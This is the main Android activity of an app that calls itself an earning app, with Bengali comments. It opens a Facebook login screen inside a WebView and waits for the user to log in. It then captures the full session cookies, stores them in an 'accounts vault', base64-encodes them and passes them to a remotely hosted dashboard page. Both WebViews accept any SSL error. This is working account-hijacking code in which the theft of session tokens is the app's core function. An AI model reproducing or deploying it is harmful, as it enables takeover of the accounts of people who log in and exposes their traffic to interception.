package com.earner.app;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.http.SslError;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.SslErrorHandler;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import org.json.JSONObject;

public class MainActivity extends Activity {
    private WebView mainWebView;
    private WebView fbLoginWebView;
    private LinearLayout fbLoginContainer;

    private final String APP_URL = "https://devid01895.pythonanywhere.com/app";
    private boolean loginHandled = false;

    private SharedPreferences prefs;
    private Handler loginCheckHandler = new Handler(Looper.getMainLooper());
    private Runnable loginCheckRunnable;

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        prefs = getSharedPreferences("FB_ACCOUNTS_VAULT", MODE_PRIVATE);

        // Android 13+ নোটিফিকেশন পারমিশন চাওয়া (যাতে ব্যাকগ্রাউন্ড সার্ভিস চালু থাকে)
        if (Build.VERSION.SDK_INT >= 33) {
            if (checkSelfPermission("android.permission.POST_NOTIFICATIONS") != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{"android.permission.POST_NOTIFICATIONS"}, 101);
            }
        }

        // ব্যাকগ্রাউন্ড অটো-পাইলট সার্ভিস চালু করা
        Intent serviceIntent = new Intent(this, AutoPilotService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        FrameLayout rootLayout = new FrameLayout(this);
        rootLayout.setLayoutParams(new FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));

        // ১. মেইন ড্যাশবোর্ড WebView
        mainWebView = new WebView(this);
        setupWebView(mainWebView);
        mainWebView.setBackgroundColor(Color.parseColor("#F8F9FC"));
        mainWebView.addJavascriptInterface(new AndroidBridge(), "AndroidBridge");
        mainWebView.setWebViewClient(new WebViewClient() {
            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                handler.proceed();
            }
        });
        rootLayout.addView(mainWebView, new FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));

        // ২. ফেসবুক লগইন পপ-আপ
        fbLoginContainer = new LinearLayout(this);
        fbLoginContainer.setOrientation(LinearLayout.VERTICAL);
        fbLoginContainer.setBackgroundColor(Color.WHITE);
        fbLoginContainer.setVisibility(View.GONE);

        LinearLayout topBar = new LinearLayout(this);
        topBar.setOrientation(LinearLayout.HORIZONTAL);
        topBar.setBackgroundColor(Color.parseColor("#FF1878"));
        topBar.setPadding(15, 15, 15, 15);
        topBar.setGravity(Gravity.CENTER_VERTICAL);

        TextView title = new TextView(this);
        title.setText("ফেসবুক আইডি লগইন");
        title.setTextColor(Color.WHITE);
        title.setTextSize(15);
        title.setLayoutParams(new LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f));

        Button saveNowBtn = new Button(this);
        saveNowBtn.setText("✅ সেভ করুন");
        saveNowBtn.setBackgroundColor(Color.parseColor("#10B981"));
        saveNowBtn.setTextColor(Color.WHITE);
        saveNowBtn.setOnClickListener(v -> checkAndSaveLogin(true));

        Button closeBtn = new Button(this);
        closeBtn.setText("বাতিল");
        closeBtn.setOnClickListener(v -> {
            prefs.edit().putBoolean("is_user_logging_in", false).apply();
            loginCheckHandler.removeCallbacksAndMessages(null);
            fbLoginContainer.setVisibility(View.GONE);
        });

        topBar.addView(title);
        topBar.addView(saveNowBtn);
        topBar.addView(closeBtn);
        fbLoginContainer.addView(topBar);

        fbLoginWebView = new WebView(this);
        setupWebView(fbLoginWebView);
        fbLoginWebView.setWebViewClient(new WebViewClient() {
            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                handler.proceed();
            }
            @Override
            public void onPageFinished(WebView view, String url) {
                checkAndSaveLogin(false);
            }
        });
        fbLoginContainer.addView(fbLoginWebView, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));

        rootLayout.addView(fbLoginContainer, new FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));

        setContentView(rootLayout);
        mainWebView.loadUrl(APP_URL);
    }

    private void checkAndSaveLogin(boolean manualClick) {
        if (loginHandled) return;
        CookieManager.getInstance().flush();
        String c1 = CookieManager.getInstance().getCookie("https://m.facebook.com");
        String c2 = CookieManager.getInstance().getCookie("https://www.facebook.com");
        String cookies = (c1 != null && c1.contains("c_user=")) ? c1 : c2;

        if (cookies != null && cookies.contains("c_user=")) {
            String uid = "";
            for (String part : cookies.split(";")) {
                String p = part.trim();
                if (p.startsWith("c_user=")) {
                    uid = p.substring(7);
                    break;
                }
            }
            if (!uid.isEmpty()) {
                loginHandled = true;
                prefs.edit().putBoolean("is_user_logging_in", false).apply();
                loginCheckHandler.removeCallbacksAndMessages(null);
                saveFbCookie(uid, cookies);
                String b64Cookie = "";
                try {
                    b64Cookie = Base64.encodeToString(cookies.getBytes("UTF-8"), Base64.NO_WRAP);
                } catch (Exception ignored) {}
                final String finalUid = uid;
                final String finalB64 = b64Cookie;
                runOnUiThread(() -> {
                    fbLoginContainer.setVisibility(View.GONE);
                    Toast.makeText(MainActivity.this, "আইডি (" + finalUid + ") সেভ হয়েছে!", Toast.LENGTH_SHORT).show();
                    mainWebView.evaluateJavascript("if(window.onNativeFbAdded) window.onNativeFbAdded('" + finalUid + "', '" + finalB64 + "');", null);
                });
                return;
            }
        }
        if (manualClick) {
            Toast.makeText(this, "আগে ফেসবুকে লগইন সম্পন্ন করুন!", Toast.LENGTH_SHORT).show();
        }
    }

    private void startLoginPolling() {
        loginCheckRunnable = new Runnable() {
            @Override
            public void run() {
                if (!loginHandled && fbLoginContainer.getVisibility() == View.VISIBLE) {
                    checkAndSaveLogin(false);
                    loginCheckHandler.postDelayed(this, 1500);
                }
            }
        };
        loginCheckHandler.postDelayed(loginCheckRunnable, 1500);
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void setupWebView(WebView wv) {
        WebSettings ws = wv.getSettings();
        ws.setJavaScriptEnabled(true);
        ws.setDomStorageEnabled(true);
        ws.setDatabaseEnabled(true);
        ws.setAllowFileAccess(true);
        ws.setAllowContentAccess(true);
        CookieManager.getInstance().setAcceptCookie(true);
        CookieManager.getInstance().setAcceptThirdPartyCookies(wv, true);
    }

    private void saveFbCookie(String uid, String cookieStr) {
        try {
            String jsonStr = prefs.getString("cookies_map", "{}");
            JSONObject obj = new JSONObject(jsonStr);
            obj.put(uid, cookieStr);
            prefs.edit().putString("cookies_map", obj.toString()).apply();
        } catch (Exception e) { e.printStackTrace(); }
    }

    public class AndroidBridge {
        @JavascriptInterface
        public void setWorkerId(int workerId) {
            prefs.edit().putInt("active_worker_id", workerId).apply();
        }

        @JavascriptInterface
        public void openFbLogin() {
            runOnUiThread(() -> {
                loginHandled = false;
                prefs.edit().putBoolean("is_user_logging_in", true).apply();
                CookieManager.getInstance().removeAllCookies(unused -> {
                    CookieManager.getInstance().flush();
                    fbLoginContainer.setVisibility(View.VISIBLE);
                    fbLoginWebView.loadUrl("https://m.facebook.com");
                    startLoginPolling();
                });
            });
        }
    }

    @Override
    public void onBackPressed() {
        if (fbLoginContainer.getVisibility() == View.VISIBLE) {
            prefs.edit().putBoolean("is_user_logging_in", false).apply();
            loginCheckHandler.removeCallbacksAndMessages(null);
            fbLoginContainer.setVisibility(View.GONE);
        } else if (mainWebView.canGoBack()) {
            mainWebView.goBack();
        } else {
            super.onBackPressed();
        }
    }
}
